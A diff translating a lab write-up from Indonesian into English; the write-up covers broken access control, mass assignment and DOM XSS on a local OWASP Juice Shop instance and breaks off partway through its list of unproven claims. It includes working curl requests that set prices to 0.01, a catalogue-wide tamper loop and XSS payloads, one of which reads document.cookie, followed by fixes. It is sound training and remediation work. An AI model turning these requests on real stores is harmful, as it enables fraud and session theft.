@@ -1,5 +1,5 @@
 <!DOCTYPE html>
-<html lang="id">
+<html lang="en">
 <head>
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width,initial-scale=1">
@@ -11,82 +11,82 @@
 <header class="site"><div class="wrap">
   <span class="brand">Twist<span class="dot">://</span>security</span>
   <nav>
-    <a href="../index.html">Writeups</a>
-    <a href="../index.html#tentang">Tentang</a>
+    <a href="../index.html">Write-ups</a>
+    <a href="../index.html#about">About</a>
   </nav>
 </div></header>
 <article><div class="wrap">
-<div class="crumbs"><a href="../index.html">writeups</a> / 004</div>
+<div class="crumbs"><a href="../index.html">write-ups</a> / 004</div>
 <h1>Broken Access Control + DOM XSS</h1>
 <div class="meta-box">
   <div><b>Target</b> Juice Shop</div>
-  <div><b>Kelas</b> Access Control</div>
+  <div><b>Class</b> Access Control</div>
   <div><b>Severity</b> <span class="badge" style="color:#ff4d5e">CRITICAL</span> <small>cvss 9.1</small></div>
-  <div><b>Peneliti</b> Twist</div>
+  <div><b>Researcher</b> Twist</div>
 </div>
 
-<p><strong>Target:</strong> OWASP Juice Shop v6.2.0-SNAPSHOT (instance lokal — lab latihan)
-<strong>Endpoint utama:</strong> <code>PUT /api/Products/:id</code>
-<strong>Tanggal:</strong> 9 Oktober 2026
-<strong>Peneliti:</strong> Twist
+<p><strong>Target:</strong> OWASP Juice Shop v6.2.0-SNAPSHOT (local instance — training lab)
+<strong>Primary endpoint:</strong> <code>PUT /api/Products/:id</code>
+<strong>Date:</strong> 9 October 2026
+<strong>Researcher:</strong> Twist
 <strong>Severity:</strong> CRITICAL (Broken Access Control) + HIGH (DOM XSS)</p>
 <hr />
-<h2 id="1-ringkasan">1. Ringkasan</h2>
-<p>Endpoint <code>PUT /api/Products/:id</code> <strong>tidak memerlukan autentikasi apa pun</strong>.
-Penyerang tanpa login bisa mengubah <strong>nama, harga, deskripsi, dan gambar</strong>
-seluruh katalog produk.</p>
-<p>Ditambah: parameter pencarian <code>?q=</code> di-render sebagai HTML mentah
-(<code>bypassSecurityTrustHtml</code>) → <strong>DOM XSS yang terbukti mengeksekusi JavaScript</strong>.</p>
-<p>Dua kerentanan digabung = penyerang anonim bisa <strong>merusak katalog dan
-menjalankan kode di browser setiap pengunjung</strong>.</p>
+<h2 id="1-summary">1. Summary</h2>
+<p>The <code>PUT /api/Products/:id</code> endpoint <strong>requires no authentication whatsoever</strong>.
+An attacker with no account can modify the <strong>name, price, description, and
+image</strong> of the entire product catalogue.</p>
+<p>Additionally: the search parameter <code>?q=</code> is rendered as raw HTML
+(<code>bypassSecurityTrustHtml</code>) → <strong>DOM XSS with confirmed JavaScript execution</strong>.</p>
+<p>Combined, an anonymous attacker can <strong>corrupt the catalogue and execute code in
+every visitor's browser</strong>.</p>
 <hr />
-<h2 id="2-dampak">2. Dampak</h2>
+<h2 id="2-impact">2. Impact</h2>
 <table>
 <thead>
 <tr>
-<th>Aspek</th>
+<th>Aspect</th>
 <th>Detail</th>
 </tr>
 </thead>
 <tbody>
 <tr>
-<td>Autentikasi</td>
-<td><strong>TIDAK PERLU</strong> — endpoint terbuka penuh</td>
+<td>Authentication</td>
+<td><strong>NOT required</strong> — endpoint fully open</td>
 </tr>
 <tr>
-<td>Produk terdampak</td>
-<td><strong>36 dari 45</strong> produk berhasil diubah dalam <strong>1,1 detik</strong></td>
+<td>Products affected</td>
+<td><strong>36 of 45</strong> modified in <strong>1.1 seconds</strong></td>
 </tr>
 <tr>
-<td>Data yang bisa diubah</td>
+<td>Modifiable fields</td>
 <td>name, price, deluxePrice, description, image</td>
 </tr>
 <tr>
-<td>Kerugian finansial</td>
-<td>Semua harga bisa jadi <code>0.01</code> → beli apa pun seharga 1 sen</td>
+<td>Financial impact</td>
+<td>Any price can be set to <code>0.01</code> — buy anything for a cent</td>
 </tr>
 <tr>
 <td>XSS</td>
-<td>JavaScript jalan di browser korban (terbukti)</td>
+<td>JavaScript executes in the victim's browser (confirmed)</td>
 </tr>
 <tr>
-<td>Siapa yang bisa</td>
-<td><strong>Siapa pun dengan akses jaringan</strong> — tanpa akun</td>
+<td>Who can do it</td>
+<td><strong>Anyone with network access</strong> — no account needed</td>
 </tr>
 </tbody>
 </table>
-<p><strong>Kombinasi mematikan:</strong> ubah harga jadi 0, lalu suntik XSS ke halaman yang
-dilihat semua pengunjung.</p>
+<p><strong>The lethal combination:</strong> set prices to zero, then inject XSS into the page
+every visitor sees.</p>
 <hr />
-<h2 id="3-langkah-reproduksi">3. Langkah Reproduksi</h2>
-<h3 id="bukti-1-baseline-kondisi-normal">Bukti 1 — Baseline (kondisi normal)</h3>
+<h2 id="3-reproduction-steps">3. Reproduction Steps</h2>
+<h3 id="evidence-1-baseline-normal-state">Evidence 1 — Baseline (normal state)</h3>
 <div class="codehilite"><pre><span></span><code>curl<span class="w"> </span>-sS<span class="w"> </span>http://localhost:3000/api/Products/1
 </code></pre></div>
 
 <div class="codehilite"><pre><span></span><code><span class="p">{</span><span class="nt">"status"</span><span class="p">:</span><span class="s2">"success"</span><span class="p">,</span><span class="nt">"data"</span><span class="p">:{</span><span class="nt">"id"</span><span class="p">:</span><span class="mi">1</span><span class="p">,</span><span class="nt">"name"</span><span class="p">:</span><span class="s2">"Apple Juice (1000ml)"</span><span class="p">,</span><span class="nt">"price"</span><span class="p">:</span><span class="mf">1.99</span><span class="p">,</span><span class="w"> </span><span class="err">...</span><span class="p">}}</span>
 </code></pre></div>
 
-<h3 id="bukti-2-uji-otorisasi-seluruh-endpoint-write">Bukti 2 — Uji otorisasi seluruh endpoint write</h3>
+<h3 id="evidence-2-authorisation-test-across-all-write-endpoints">Evidence 2 — Authorisation test across all write endpoints</h3>
 <div class="codehilite"><pre><span></span><code><span class="k">for</span><span class="w"> </span>ep<span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="s2">"PUT /api/Products/1"</span><span class="w"> </span><span class="s2">"POST /api/Products"</span><span class="w"> </span><span class="s2">"DELETE /api/Products/45"</span><span class="w"> </span><span class="se">\</span>
 <span class="w">          </span><span class="s2">"PUT /api/Users/1"</span><span class="w"> </span><span class="s2">"DELETE /api/Users/24"</span><span class="w"> </span><span class="s2">"POST /rest/products/reviews"</span><span class="p">;</span><span class="w"> </span><span class="k">do</span>
 <span class="w">  </span>curl<span class="w"> </span>-sS<span class="w"> </span>-o<span class="w"> </span>/dev/null<span class="w"> </span>-w<span class="w"> </span><span class="s2">"%{http_code}  </span><span class="nv">$ep</span><span class="s2">\n"</span><span class="w"> </span>-X<span class="w"> </span><span class="si">${</span><span class="nv">ep</span><span class="p">%% *</span><span class="si">}</span><span class="w"> </span><span class="se">\</span>
@@ -94,17 +94,19 @@ dilihat semua pengunjung.</p>
 <span class="k">done</span>
 </code></pre></div>
 
-<p><strong>Hasil:</strong></p>
-<div class="codehilite"><pre><span></span><code>200  PUT    /api/Products/1          ← TERBUKA (tanpa auth!)
-401  POST   /api/Products            ← benar, butuh auth
-401  DELETE /api/Products/45         ← benar
-401  PUT    /api/Users/1             ← benar
-401  DELETE /api/Users/24            ← benar
-401  POST   /rest/products/reviews   ← benar
+<p><strong>Result:</strong></p>
+<div class="codehilite"><pre><span></span><code>200  PUT    /api/Products/1          ← OPEN (no auth!)
+401  POST   /api/Products            ← correct, auth required
+401  DELETE /api/Products/45         ← correct
+401  PUT    /api/Users/1             ← correct
+401  DELETE /api/Users/24            ← correct
+401  POST   /rest/products/reviews   ← correct
 </code></pre></div>
 
-<p><strong>Temuan:</strong> satu endpoint lolos dari middleware otorisasi — <code>PUT /api/Products/:id</code>.</p>
-<h3 id="bukti-3-eksploitasi-tanpa-token-tanpa-authorization-header">Bukti 3 — Eksploitasi tanpa token (TANPA Authorization header)</h3>
+<p><strong>Finding:</strong> one endpoint slipped past the authorisation middleware —
+<code>PUT /api/Products/:id</code>. The pattern is unmistakable: every sibling route is
+guarded, this one is not.</p>
+<h3 id="evidence-3-exploitation-with-no-token-no-authorization-header">Evidence 3 — Exploitation with no token (NO Authorization header)</h3>
 <div class="codehilite"><pre><span></span><code>curl<span class="w"> </span>-sS<span class="w"> </span>-X<span class="w"> </span>PUT<span class="w"> </span>http://localhost:3000/api/Products/1<span class="w"> </span><span class="se">\</span>
 <span class="w">  </span>-H<span class="w"> </span><span class="s2">"Content-Type: application/json"</span><span class="w"> </span><span class="se">\</span>
 <span class="w">  </span>-d<span class="w"> </span><span class="s1">'{"description":"TAMPERED-BUT-NOAUTH"}'</span>
@@ -113,12 +115,12 @@ dilihat semua pengunjung.</p>
 <div class="codehilite"><pre><span></span><code><span class="p">{</span><span class="nt">"status"</span><span class="p">:</span><span class="s2">"success"</span><span class="p">,</span><span class="nt">"data"</span><span class="p">:{</span><span class="nt">"id"</span><span class="p">:</span><span class="mi">1</span><span class="p">,</span><span class="nt">"description"</span><span class="p">:</span><span class="s2">"TAMPERED-BUT-NOAUTH"</span><span class="p">,</span><span class="w"> </span><span class="err">...</span><span class="p">}}</span>
 </code></pre></div>
 
-<p>Verifikasi:</p>
+<p>Verification:</p>
 <div class="codehilite"><pre><span></span><code>curl<span class="w"> </span>-sS<span class="w"> </span>http://localhost:3000/api/Products/1<span class="w"> </span><span class="p">|</span><span class="w"> </span>python<span class="w"> </span>-c<span class="w"> </span><span class="s2">"import sys,json;print(json.load(sys.stdin)['data']['description'])"</span>
-<span class="c1"># → TAMPERED-BUT-NOAUTH     ← benar-benar tersimpan</span>
+<span class="c1"># → TAMPERED-BUT-NOAUTH     ← actually persisted</span>
 </code></pre></div>
 
-<h3 id="bukti-4-mass-assignment-field-sensitif-ikut-berubah">Bukti 4 — Mass assignment (field sensitif ikut berubah)</h3>
+<h3 id="evidence-4-mass-assignment-sensitive-fields-included">Evidence 4 — Mass assignment (sensitive fields included)</h3>
 <div class="codehilite"><pre><span></span><code>curl<span class="w"> </span>-sS<span class="w"> </span>-X<span class="w"> </span>PUT<span class="w"> </span>http://localhost:3000/api/Products/1<span class="w"> </span><span class="se">\</span>
 <span class="w">  </span>-H<span class="w"> </span><span class="s2">"Content-Type: application/json"</span><span class="w"> </span><span class="se">\</span>
 <span class="w">  </span>-d<span class="w"> </span><span class="s1">'{"name":"HACKED-JUICE","price":0.01,"deluxePrice":0.01,</span>
@@ -130,9 +132,9 @@ dilihat semua pengunjung.</p>
 <thead>
 <tr>
 <th>Field</th>
-<th>Nilai awal</th>
-<th>Nilai setelah</th>
-<th>Berubah?</th>
+<th>Initial</th>
+<th>After</th>
+<th>Changed?</th>
 </tr>
 </thead>
 <tbody>
@@ -156,7 +158,7 @@ dilihat semua pengunjung.</p>
 </tr>
 <tr>
 <td>description</td>
-<td>(teks asli)</td>
+<td>(original text)</td>
 <td><code>&lt;script&gt;alert(1)&lt;/script&gt;</code></td>
 <td>✅</td>
 </tr>
@@ -168,18 +170,17 @@ dilihat semua pengunjung.</p>
 </tr>
 </tbody>
 </table>
-<p><strong>Tidak ada whitelist field</strong> — semua field yang dikirim diterima mentah
-(mass assignment).</p>
-<h3 id="bukti-5-mass-tamper-seluruh-katalog-dalam-1-detik">Bukti 5 — MASS TAMPER: seluruh katalog dalam 1 detik</h3>
+<p><strong>No field whitelist</strong> — every field sent is accepted verbatim (mass assignment).</p>
+<h3 id="evidence-5-mass-tamper-entire-catalogue-in-one-second">Evidence 5 — MASS TAMPER: entire catalogue in one second</h3>
 <div class="codehilite"><pre><span></span><code><span class="k">for</span> <span class="n">pid</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">46</span><span class="p">):</span>
     <span class="n">PUT</span> <span class="o">/</span><span class="n">api</span><span class="o">/</span><span class="n">Products</span><span class="o">/</span><span class="p">{</span><span class="n">pid</span><span class="p">}</span>  <span class="p">{</span><span class="s2">"price"</span><span class="p">:</span> <span class="mf">0.01</span><span class="p">}</span>
 </code></pre></div>
 
-<div class="codehilite"><pre><span></span><code>berhasil ubah: 36/45 produk   (1,1 detik)
-gagal:          9/45          (produk lama tanpa field wajib)
+<div class="codehilite"><pre><span></span><code>successfully modified: 36/45 products   (1.1 seconds)
+failed:                 9/45            (legacy products missing required fields)
 </code></pre></div>
 
-<p><strong>Bukti dampak:</strong></p>
+<p><strong>Impact evidence:</strong></p>
 <div class="codehilite"><pre><span></span><code>id= 1  HACKED-JUICE                 price=0.01
 id= 2  Orange Juice (1000ml)        price=0.01
 id= 3  Eggfruit Juice (500ml)       price=0.01
@@ -187,60 +188,62 @@ id=24  Apple Pomace                 price=0.01
 id=45  OWASP Juice Shop LEGO™ Tower price=0.01
 </code></pre></div>
 
-<h3 id="bukti-6-dom-xss-terbukti-eksekusi-di-browser">Bukti 6 — DOM XSS (terbukti eksekusi di browser)</h3>
-<p><strong>Akar masalah — kode yang sengaja mematikan sanitizer</strong> (<code>main.js</code>):</p>
+<h3 id="evidence-6-dom-xss-confirmed-execution-in-a-real-browser">Evidence 6 — DOM XSS (confirmed execution in a real browser)</h3>
+<p><strong>Root cause — code that deliberately disables the sanitiser</strong> (<code>main.js</code>):</p>
 <div class="codehilite"><pre><span></span><code><span class="nx">trustProductDescription</span><span class="p">(</span><span class="nx">t</span><span class="p">){</span>
 <span class="w">  </span><span class="k">for</span><span class="p">(</span><span class="kd">let</span><span class="w"> </span><span class="nx">i</span><span class="o">=</span><span class="mf">0</span><span class="p">;</span><span class="nx">i</span><span class="o">&lt;</span><span class="nx">t</span><span class="p">.</span><span class="nx">length</span><span class="p">;</span><span class="nx">i</span><span class="o">++</span><span class="p">)</span>
 <span class="w">    </span><span class="nx">t</span><span class="p">[</span><span class="nx">i</span><span class="p">].</span><span class="nx">description</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">this</span><span class="p">.</span><span class="nx">sanitizer</span><span class="p">.</span><span class="nx">bypassSecurityTrustHtml</span><span class="p">(</span><span class="nx">t</span><span class="p">[</span><span class="nx">i</span><span class="p">].</span><span class="nx">description</span><span class="p">)</span>
 <span class="p">}</span>
 
-<span class="c1">// dan untuk parameter pencarian:</span>
+<span class="c1">// and for the search parameter:</span>
 <span class="k">this</span><span class="p">.</span><span class="nx">searchValue</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">this</span><span class="p">.</span><span class="nx">sanitizer</span><span class="p">.</span><span class="nx">bypassSecurityTrustHtml</span><span class="p">(</span><span class="nx">t</span><span class="p">)</span>
 </code></pre></div>
 
-<p><code>bypassSecurityTrustHtml()</code> memberi tahu Angular: <em>"HTML ini aman, jangan
-disanitasi."</em> Templat lalu merender lewat <code>[innerHTML]</code>:</p>
+<p><code>bypassSecurityTrustHtml()</code> tells Angular: <em>"this HTML is safe, do not
+sanitise it."</em> The template then renders it through <code>[innerHTML]</code>:</p>
 <div class="codehilite"><pre><span></span><code><span class="nx">ey</span><span class="p">(</span><span class="s1">'innerHTML'</span><span class="p">,</span><span class="w"> </span><span class="nx">t</span><span class="p">.</span><span class="nx">searchValue</span><span class="p">,</span><span class="w"> </span><span class="nx">Ww</span><span class="p">)</span>
 </code></pre></div>
 
-<p><strong>Eksploitasi:</strong></p>
+<p><strong>Exploitation:</strong></p>
 <div class="codehilite"><pre><span></span><code>http://localhost:3000/#/search?q=&lt;img src=x onerror="alert(document.cookie)"&gt;
 </code></pre></div>
 
-<p><strong>Bukti eksekusi (headless browser):</strong></p>
+<p><strong>Execution evidence (headless browser):</strong></p>
 <div class="codehilite"><pre><span></span><code><span class="c1">// payload: &lt;img src=x onerror="window.__xss1=(window.__xss1||0)+1"&gt;</span>
 <span class="p">{</span>
-<span class="w">  </span><span class="s2">"xss_tereksekusi"</span><span class="o">:</span><span class="w"> </span><span class="mf">2</span><span class="p">,</span>
-<span class="w">  </span><span class="s2">"img_onerror_di_dom"</span><span class="o">:</span><span class="w"> </span><span class="mf">1</span><span class="p">,</span>
+<span class="w">  </span><span class="s2">"xss_executed"</span><span class="o">:</span><span class="w"> </span><span class="mf">2</span><span class="p">,</span>
+<span class="w">  </span><span class="s2">"img_onerror_in_dom"</span><span class="o">:</span><span class="w"> </span><span class="mf">1</span><span class="p">,</span>
 <span class="w">  </span><span class="s2">"searchValue_tag"</span><span class="o">:</span><span class="w"> </span><span class="s2">"SPAN | innerHTML: &lt;img src=\"x\" onerror=\"window.__xss1=...\"&gt;"</span>
 <span class="p">}</span>
 </code></pre></div>
 
-<p><strong><code>xss_tereksekusi: 2</code> — JavaScript BENAR-BENAR JALAN.</strong> ✅</p>
+<p><strong><code>xss_executed: 2</code> — the JavaScript genuinely ran.</strong> ✅</p>
 <hr />
-<h2 id="4-akar-masalah">4. Akar Masalah</h2>
-<h3 id="41-middleware-otorisasi-bolong">4.1 Middleware otorisasi bolong</h3>
-<p>Endpoint <code>PUT /api/Products/:id</code> tidak dilindungi. Pola yang benar (Express):</p>
-<div class="codehilite"><pre><span></span><code><span class="c1">// SALAH — tidak ada guard</span>
+<h2 id="4-root-cause">4. Root Cause</h2>
+<h3 id="41-authorisation-middleware-gap">4.1 Authorisation middleware gap</h3>
+<p>The <code>PUT /api/Products/:id</code> endpoint is unprotected. The correct pattern
+(Express):</p>
+<div class="codehilite"><pre><span></span><code><span class="c1">// WRONG — no guard</span>
 <span class="nx">router</span><span class="p">.</span><span class="nx">put</span><span class="p">(</span><span class="s1">'/:id'</span><span class="p">,</span><span class="w"> </span><span class="p">(</span><span class="nx">req</span><span class="p">,</span><span class="w"> </span><span class="nx">res</span><span class="p">)</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="p">...</span><span class="w"> </span><span class="p">});</span>
 
-<span class="c1">// BENAR — wajib cek autentikasi + peran</span>
+<span class="c1">// RIGHT — authentication + role check</span>
 <span class="kd">const</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="nx">authenticate</span><span class="p">,</span><span class="w"> </span><span class="nx">authorize</span><span class="w"> </span><span class="p">}</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">require</span><span class="p">(</span><span class="s1">'../lib/security'</span><span class="p">);</span>
 
 <span class="nx">router</span><span class="p">.</span><span class="nx">put</span><span class="p">(</span><span class="s1">'/:id'</span><span class="p">,</span>
-<span class="w">  </span><span class="nx">authenticate</span><span class="p">(),</span><span class="w">                    </span><span class="c1">// token valid?</span>
-<span class="w">  </span><span class="nx">authorize</span><span class="p">([</span><span class="s1">'admin'</span><span class="p">]),</span><span class="w">              </span><span class="c1">// peran admin?</span>
+<span class="w">  </span><span class="nx">authenticate</span><span class="p">(),</span><span class="w">                    </span><span class="c1">// valid token?</span>
+<span class="w">  </span><span class="nx">authorize</span><span class="p">([</span><span class="s1">'admin'</span><span class="p">]),</span><span class="w">              </span><span class="c1">// admin role?</span>
 <span class="w">  </span><span class="p">(</span><span class="nx">req</span><span class="p">,</span><span class="w"> </span><span class="nx">res</span><span class="p">)</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="p">...</span><span class="w"> </span><span class="p">}</span>
 <span class="p">);</span>
 </code></pre></div>
 
-<p><strong>Root cause:</strong> rute didaftarkan langsung ke handler tanpa middleware.
-Rute lain punya <code>authenticate()</code>, rute ini tidak — kesalahan konfigurasi.</p>
+<p><strong>Root cause:</strong> the route was registered directly to a handler with no
+middleware. Every other route has <code>authenticate()</code> — this one was missed. A
+configuration error, not a design flaw.</p>
 <h3 id="42-mass-assignment">4.2 Mass assignment</h3>
-<div class="codehilite"><pre><span></span><code><span class="c1">// SALAH — seluruh body diterima</span>
+<div class="codehilite"><pre><span></span><code><span class="c1">// WRONG — entire body accepted</span>
 <span class="k">await</span><span class="w"> </span><span class="nx">Product</span><span class="p">.</span><span class="nx">update</span><span class="p">(</span><span class="nx">req</span><span class="p">.</span><span class="nx">body</span><span class="p">,</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="nx">where</span><span class="o">:</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="nx">id</span><span class="o">:</span><span class="w"> </span><span class="nx">req</span><span class="p">.</span><span class="nx">params</span><span class="p">.</span><span class="nx">id</span><span class="w"> </span><span class="p">}</span><span class="w"> </span><span class="p">});</span>
 
-<span class="c1">// BENAR — whitelist field eksplisit</span>
+<span class="c1">// RIGHT — explicit field whitelist</span>
 <span class="kd">const</span><span class="w"> </span><span class="nx">ALLOWED</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">[</span><span class="s1">'name'</span><span class="p">,</span><span class="w"> </span><span class="s1">'description'</span><span class="p">,</span><span class="w"> </span><span class="s1">'image'</span><span class="p">];</span>
 <span class="kd">const</span><span class="w"> </span><span class="nx">patch</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">Object</span><span class="p">.</span><span class="nx">fromEntries</span><span class="p">(</span>
 <span class="w">  </span><span class="nb">Object</span><span class="p">.</span><span class="nx">entries</span><span class="p">(</span><span class="nx">req</span><span class="p">.</span><span class="nx">body</span><span class="p">).</span><span class="nx">filter</span><span class="p">(([</span><span class="nx">k</span><span class="p">])</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="nx">ALLOWED</span><span class="p">.</span><span class="nx">includes</span><span class="p">(</span><span class="nx">k</span><span class="p">))</span>
@@ -248,33 +251,33 @@ Rute lain punya <code>authenticate()</code>, rute ini tidak — kesalahan konfig
 <span class="k">await</span><span class="w"> </span><span class="nx">Product</span><span class="p">.</span><span class="nx">update</span><span class="p">(</span><span class="nx">patch</span><span class="p">,</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="nx">where</span><span class="o">:</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="nx">id</span><span class="o">:</span><span class="w"> </span><span class="nx">req</span><span class="p">.</span><span class="nx">params</span><span class="p">.</span><span class="nx">id</span><span class="w"> </span><span class="p">}</span><span class="w"> </span><span class="p">});</span>
 </code></pre></div>
 
-<h3 id="43-sanitizer-dimatikan-sengaja">4.3 Sanitizer dimatikan sengaja</h3>
-<div class="codehilite"><pre><span></span><code><span class="c1">// SALAH — membuka pintu XSS</span>
+<h3 id="43-sanitiser-deliberately-disabled">4.3 Sanitiser deliberately disabled</h3>
+<div class="codehilite"><pre><span></span><code><span class="c1">// WRONG — opens the door to XSS</span>
 <span class="k">this</span><span class="p">.</span><span class="nx">sanitizer</span><span class="p">.</span><span class="nx">bypassSecurityTrustHtml</span><span class="p">(</span><span class="nx">userControlledData</span><span class="p">)</span>
 
-<span class="c1">// BENAR — biarkan Angular menyaring</span>
-<span class="c1">// cukup: &lt;div [innerHTML]="product.description"&gt;&lt;/div&gt;</span>
+<span class="c1">// RIGHT — let Angular filter</span>
+<span class="c1">// just: &lt;div [innerHTML]="product.description"&gt;&lt;/div&gt;</span>
 </code></pre></div>
 
-<p><code>bypassSecurityTrustHtml</code> hanya untuk HTML yang <strong>dibuat sendiri sepenuhnya</strong>,
-tidak pernah untuk data dari pengguna.</p>
+<p><code>bypassSecurityTrustHtml</code> is only for HTML that is <strong>entirely
+self-constructed</strong> — never for user-supplied data.</p>
 <hr />
-<h2 id="5-saran-perbaikan">5. Saran Perbaikan</h2>
-<p><strong>1. Lindungi endpoint (paling mendesak)</strong></p>
+<h2 id="5-remediation">5. Remediation</h2>
+<p><strong>1. Protect the endpoint (most urgent)</strong></p>
 <div class="codehilite"><pre><span></span><code><span class="nx">router</span><span class="p">.</span><span class="nx">put</span><span class="p">(</span><span class="s1">'/:id'</span><span class="p">,</span><span class="w"> </span><span class="nx">authenticate</span><span class="p">(),</span><span class="w"> </span><span class="nx">authorize</span><span class="p">([</span><span class="s1">'admin'</span><span class="p">]),</span><span class="w"> </span><span class="nx">handler</span><span class="p">);</span>
 </code></pre></div>
 
-<p><strong>2. Whitelist field</strong></p>
+<p><strong>2. Whitelist fields</strong></p>
 <div class="codehilite"><pre><span></span><code><span class="kd">const</span><span class="w"> </span><span class="nx">FIELD_WHITELIST</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">[</span><span class="s1">'name'</span><span class="p">,</span><span class="w"> </span><span class="s1">'description'</span><span class="p">,</span><span class="w"> </span><span class="s1">'image'</span><span class="p">,</span><span class="w"> </span><span class="s1">'price'</span><span class="p">];</span>
 </code></pre></div>
 
-<p><strong>3. Jangan bypass sanitizer untuk input pengguna</strong></p>
-<div class="codehilite"><pre><span></span><code><span class="c1">// hapus semua bypassSecurityTrustHtml yang menyentuh data pengguna</span>
-<span class="c1">// cukup gunakan [innerHTML] biasa → Angular otomatis menyaring</span>
+<p><strong>3. Never bypass the sanitiser for user input</strong></p>
+<div class="codehilite"><pre><span></span><code><span class="c1">// remove every bypassSecurityTrustHtml that touches user data</span>
+<span class="c1">// plain [innerHTML] is sufficient → Angular filters automatically</span>
 </code></pre></div>
 
-<p><strong>4. Kontrol terpadu — jangan per-rute manual</strong></p>
-<div class="codehilite"><pre><span></span><code><span class="c1">// semua rute /admin/* otomatis butuh admin</span>
+<p><strong>4. Centralised control — not per-route manual guards</strong></p>
+<div class="codehilite"><pre><span></span><code><span class="c1">// every write under /api/Products automatically requires admin</span>
 <span class="nx">app</span><span class="p">.</span><span class="nx">use</span><span class="p">(</span><span class="s1">'/api/Products'</span><span class="p">,</span><span class="w"> </span><span class="p">(</span><span class="nx">req</span><span class="p">,</span><span class="nx">res</span><span class="p">,</span><span class="nx">next</span><span class="p">)</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="p">{</span>
 <span class="w">  </span><span class="k">if</span><span class="w"> </span><span class="p">([</span><span class="s1">'POST'</span><span class="p">,</span><span class="s1">'PUT'</span><span class="p">,</span><span class="s1">'PATCH'</span><span class="p">,</span><span class="s1">'DELETE'</span><span class="p">].</span><span class="nx">includes</span><span class="p">(</span><span class="nx">req</span><span class="p">.</span><span class="nx">method</span><span class="p">))</span>
 <span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="nx">authenticate</span><span class="p">()(</span><span class="nx">req</span><span class="p">,</span><span class="nx">res</span><span class="p">,</span><span class="w"> </span><span class="p">()</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="nx">authorize</span><span class="p">([</span><span class="s1">'admin'</span><span class="p">])(</span><span class="nx">req</span><span class="p">,</span><span class="nx">res</span><span class="p">,</span><span class="nx">next</span><span class="p">));</span>
@@ -282,97 +285,97 @@ tidak pernah untuk data dari pengguna.</p>
 <span class="p">});</span>
 </code></pre></div>
 
-<p><strong>5. Helmet + CSP</strong> — CSP ketat mematikan XSS walau payload masuk:</p>
+<p><strong>5. Helmet + CSP</strong> — a strict CSP neutralises XSS even when the payload lands:</p>
 <div class="codehilite"><pre><span></span><code>Content-Security-Policy: default-src 'self'; script-src 'self'
 </code></pre></div>
 
-<p><em>(Catatan: header CSP di instance ini memang hilang — lihat writeup 002.)</em></p>
-<p><strong>6. Audit otomatis</strong></p>
-<div class="codehilite"><pre><span></span><code><span class="c1"># cek semua rute write tanpa middleware</span>
+<p><em>(Note: this instance has no CSP header at all — see write-up 002 §5.)</em></p>
+<p><strong>6. Automated audit</strong></p>
+<div class="codehilite"><pre><span></span><code><span class="c1"># find every write route missing middleware</span>
 grep<span class="w"> </span>-rnE<span class="w"> </span><span class="s2">"router\.(put|post|patch|delete)\("</span><span class="w"> </span>routes/<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>-v<span class="w"> </span><span class="s2">"authenticate"</span>
 </code></pre></div>
 
 <hr />
-<h2 id="6-perbandingan-severity">6. Perbandingan Severity</h2>
+<h2 id="6-severity-comparison">6. Severity Comparison</h2>
 <table>
 <thead>
 <tr>
-<th>Temuan</th>
-<th>CVSS (kira)</th>
-<th>Alasan</th>
+<th>Finding</th>
+<th>CVSS (approx)</th>
+<th>Reasoning</th>
 </tr>
 </thead>
 <tbody>
 <tr>
-<td>PUT tanpa auth</td>
-<td><strong>9,1 CRITICAL</strong></td>
-<td>Integritas data penuh, tanpa autentikasi</td>
+<td>PUT without auth</td>
+<td><strong>9.1 CRITICAL</strong></td>
+<td>Full data integrity, no authentication</td>
 </tr>
 <tr>
 <td>Mass assignment</td>
-<td><strong>8,6 HIGH</strong></td>
-<td>Eskalasi dari temuan di atas</td>
+<td><strong>8.6 HIGH</strong></td>
+<td>Escalation from the above</td>
 </tr>
 <tr>
 <td>DOM XSS (<code>?q=</code>)</td>
-<td><strong>7,4 HIGH</strong></td>
-<td>Eksekusi JS terbukti, kena semua pengunjung</td>
+<td><strong>7.4 HIGH</strong></td>
+<td>Confirmed JS execution, affects all visitors</td>
 </tr>
 </tbody>
 </table>
-<p>Digabung → <strong>rantai eksploitasi CRITICAL</strong>.</p>
+<p>Chained together → <strong>CRITICAL exploit chain</strong>.</p>
 <hr />
-<h2 id="7-koreksi-kejujuran-yang-tidak-terbukti">7. Koreksi &amp; Kejujuran (yang TIDAK terbukti)</h2>
-<div class="codehilite"><pre><span></span><code>✗ STORED XSS lewat description
-  → payload &lt;img onerror&gt; TERSIMPAN MENTAH di DB (terverifikasi)
-  → tapi TIDAK ADA halaman yang me-render description ke DOM
-  → hasil uji: stored_tereksekusi=0, img_payload_di_dom=0
-  → jadi: data tersimpan tanpa sanitasi (masalah integritas),
-    TAPI belum terbukti XSS. Jangan lebay saat lapor.
+<h2 id="7-corrections-honesty-what-was-not-proven">7. Corrections &amp; Honesty (what was NOT proven)</h2>
+<div class="codehilite"><pre><span></span><code>✗ STORED XSS via description
+  → payload &lt;img onerror&gt; WAS stored raw in the DB (verified)
+  → but NO page renders description into the DOM
+  → test result: stored_executed=0, img_payload_in_dom=0
+  → therefore: data stored unsanitised (an integrity issue),
+    BUT XSS is not proven. Do not overclaim in a report.
 
 ✗ SQLi WRITE via stacked query
